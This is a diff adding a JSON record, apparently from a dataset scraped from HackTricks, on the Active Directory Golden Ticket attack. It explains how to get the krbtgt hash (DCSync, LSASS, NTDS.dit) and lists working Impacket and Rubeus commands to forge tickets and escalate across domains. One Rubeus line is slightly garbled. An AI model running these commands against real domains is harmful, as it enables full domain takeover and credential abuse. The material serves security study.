@@ -1,0 +1,27 @@
+{
+  "id": "windows_hardening_97216e2089d5",
+  "category": "windows-hardening",
+  "title": "golden ticket",
+  "description": "# Golden Ticket\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Golden ticket\n\nA **Golden Ticket** attack consist on the **creation of a legitimate Ticket Granting Ticket (TGT) impersonating any user** through the use of the **NTLM hash of the Active Directory (AD) krbtgt account**. This technique is particularly advantageous because it **enables access to any service or machine** within the domain as the impersonated user. It's crucial to remember that the **krbtgt account's credentials ",
+  "payloads": [
+    "# Golden Ticket",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "## Golden ticket",
+    "A **Golden Ticket** attack consist on the **creation of a legitimate Ticket Granting Ticket (TGT) impersonating any user** through the use of the **NTLM hash of the Active Directory (AD) krbtgt account**. This technique is particularly advantageous because it **enables access to any service or machine** within the domain as the impersonated user. It's crucial to remember that the **krbtgt account's credentials are never automatically updated**.",
+    "To **acquire the NTLM hash** of the krbtgt account, various methods can be employed. It can be extracted from the **Local Security Authority Subsystem Service (LSASS) process** or the **NT Directory Services (NTDS.dit) file** located on any Domain Controller (DC) within the domain. Furthermore, **executing a DCsync attack** is another strategy to obtain this NTLM hash, which can be performed using tools such as the **lsadump::dcsync module** in Mimikatz or the **secretsdump.py script** by Impacket. It's important to underscore that to undertake these operations, **domain admin privileges or a similar level of access is typically required**.",
+    "Although the NTLM hash serves as a viable method for this purpose, it is **strongly recommended** to **forge tickets using the Advanced Encryption Standard (AES) Kerberos keys (AES128 and AES256)** for operational security reasons.",
+    "```bash:From Linux",
+    "python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus",
+    "export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache",
+    "python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass",
+    "```bash:From Windows",
+    "# Rubeus",
+    "## The /ldap command will get the details from the LDAP (so you don't need to put the SID)",
+    "## The /printcmd option will print the complete command if later you want to generate a token offline",
+    ".\\Rubeus.exe asktgt /user:Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/windows-hardening/active-directory-methodology/golden-ticket.md"
+  ]
+}
